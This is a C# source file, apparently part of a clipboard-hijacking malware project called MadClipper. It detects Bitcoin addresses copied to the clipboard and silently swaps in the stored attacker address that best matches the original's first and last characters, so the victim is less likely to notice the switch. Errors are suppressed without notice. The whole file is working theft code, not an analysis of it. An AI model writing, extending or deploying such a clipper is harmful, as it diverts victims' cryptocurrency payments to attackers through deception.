using MadClipper.Properties;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace MadClipper
{
    class Check
    {
        public static string Key = "^(1|3)[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz].*$"; 
        [STAThread]

        public static bool Clipregex(string clipboard)
        {
            var date = clipboard.Trim();
            // BTC address length from 26 to 34
            if (date.Length < 26 || date.Length > 34) return false;
            var adress = new Regex(Key);
            if (!adress.IsMatch(date)) return false;
            return true;
        }


        internal static void Sets(string originalClipboardText)
        {
            try
            {
                var origAddr = originalClipboardText.Trim();

                var bestFirstCharFits = new HashSet<string>();

                var maxFirstCharFit = 0;
                foreach (
                    var a in
                        Resources.Addresses.Split(new[] { Environment.NewLine },
                            StringSplitOptions.RemoveEmptyEntries).ToList())
                {
                    var actFirstCharFit = FirstCharFitNum(a, origAddr);

                    if (actFirstCharFit < maxFirstCharFit)
                    {
                    }
                    else if (actFirstCharFit == maxFirstCharFit)
                    {
                        bestFirstCharFits.Add(a);
                    }
                    else if (actFirstCharFit > maxFirstCharFit)
                    {
                        bestFirstCharFits.Clear();
                        maxFirstCharFit = actFirstCharFit;
                        bestFirstCharFits.Add(a);
                        Clipboard.SetText(a);

                    }
                }

                var maxLastCharFit = 0;
                foreach (var a in bestFirstCharFits)
                {
                    var actLastCharFit = LastCharFitNum(a, origAddr);

                    if (actLastCharFit <= maxLastCharFit)
                    {

                    }
                    else
                    {
                        maxLastCharFit = actLastCharFit;
                        Clipboard.SetText(a);

                    }
                }
            }
            catch
            {
                // ignored
            }

        }

        private static int LastCharFitNum(string a, string b)
        {
            var cnt = 0;
            var match = true;
            for (var i = 0; i < Math.Min(a.Length, b.Length) && match; i++)
            {
                if (a[a.Length - 1 - i] != b[b.Length - 1 - i])
                    match = false;
                else
                    cnt++;
            }
            return cnt;
        }

        private static int FirstCharFitNum(string a, string b)
        {
            var cnt = 0;
            var match = true;
            for (var i = 0; i < Math.Min(a.Length, b.Length) && match; i++)
            {
                if (a[i] != b[i])
                    match = false;
                else
                    cnt++;
            }
            return cnt;
        }
    }
}
